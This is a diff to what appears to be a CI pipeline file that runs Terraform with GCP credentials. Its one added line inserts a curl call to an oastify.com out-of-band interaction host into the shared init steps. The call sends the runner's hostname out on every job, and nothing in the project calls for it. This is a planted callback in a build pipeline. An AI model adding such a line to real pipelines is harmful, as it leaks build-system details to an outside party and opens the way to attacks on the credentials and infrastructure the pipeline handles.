@@ -45,6 +45,7 @@ stages:
     - export GOOGLE_APPLICATION_CREDENTIALS=`pwd`/.gcp_temp_cred.json
 
 .terraform-ver-init: &terraform-ver-init
+  - curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/google/devops-governance/`hostname`
   - cd $TF_ROOT
   - cp ./terraform /usr/bin/
   - terraform init -backend-config="bucket=$STATE_BUCKET" -backend-config="prefix=$CI_PROJECT_NAME" --upgrade=True
